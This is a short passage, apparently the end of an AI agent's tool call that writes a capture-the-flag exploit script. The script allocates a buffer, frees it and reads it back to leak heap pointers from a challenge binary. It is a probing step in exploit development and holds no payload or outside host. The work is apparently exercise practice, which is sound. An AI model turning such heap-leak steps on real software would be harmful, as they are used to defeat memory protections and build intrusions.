.plant(0,0x500,b'A'*0x500)\n    c.defuse(0)\n    d=c.inspect(0,0x500)\n    print('leak head:', d[:0x40].hex())\n    for i in range(0,0x30,8):\n        print(hex(i), hex(struct.unpack('<Q',d[i:i+8])[0]))\n", "path": "/home/ctfplayer/workspace/hb.py"}
